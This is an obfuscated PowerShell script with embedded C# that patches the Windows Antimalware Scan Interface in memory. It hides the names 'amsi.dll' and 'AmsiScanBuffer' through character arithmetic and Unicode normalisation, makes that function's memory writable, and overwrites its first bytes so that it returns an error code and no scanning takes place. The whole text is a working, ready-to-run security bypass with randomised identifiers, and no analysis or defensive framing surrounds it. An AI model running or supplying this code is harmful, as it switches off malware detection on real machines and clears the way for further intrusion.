$UrsNfPh7qF5CDj = @"
using System;
using System.Runtime.InteropServices;
public class UrsNfPh7qF5CDj {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr rTJnY3eowOL0Zbdn7py, string CKCCjDqqFfC8GqudpxS);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr pIP, UIntPtr N7qX6vaaOA, uint P8P53gc9MYDm, out uint WyIsYwJOYClq);
}
"@

Add-Type $UrsNfPh7qF5CDj

$IVAGR = [UrsNfPh7qF5CDj]::LoadLibrary("$([char]([BYte]0x61)+[CHAR](33+76)+[chAr]([bYte]0x73)+[ChAr]([ByTE]0x69)+[CHAr]([bYTe]0x2e)+[ChAr]([BYte]0x64)+[ChAR](108)+[cHar](108))")
$T3dkjy4S = [UrsNfPh7qF5CDj]::GetProcAddress($IVAGR, "$(('ÀmsîScän'+'Bûffèr').NORMaLiZE([ChAR]([bYte]0x46)+[CHar]([bYtE]0x6f)+[ChAr]([bytE]0x72)+[cHar](109+44-44)+[ChAr]([BYte]0x44)) -replace [chaR](68+24)+[cHar]([Byte]0x70)+[CHar](123)+[ChaR]([bYTe]0x4d)+[ChAR]([ByTE]0x6e)+[ChaR](125))")
$p = 0
[UrsNfPh7qF5CDj]::VirtualProtect($T3dkjy4S, [uint32]5, 0x40, [ref]$p)
$dpF9K2 = "0xB8"
$Pae6TC6hO7E2AX3qK = "0x57"
$O65U7DNz2p13AyL8 = "0x00"
$dN5bX = "0x07"
$PL2oT2mTQALWUNyQyo8 = "0x80"
$BWc9Er = "0xC3"
$FSyRIf = [Byte[]] ($dpF9K2,$Pae6TC6hO7E2AX3qK,$O65U7DNz2p13AyL8,$dN5bX,+$PL2oT2mTQALWUNyQyo8,+$BWc9Er)
[System.Runtime.InteropServices.Marshal]::Copy($FSyRIf, 0, $T3dkjy4S, 6)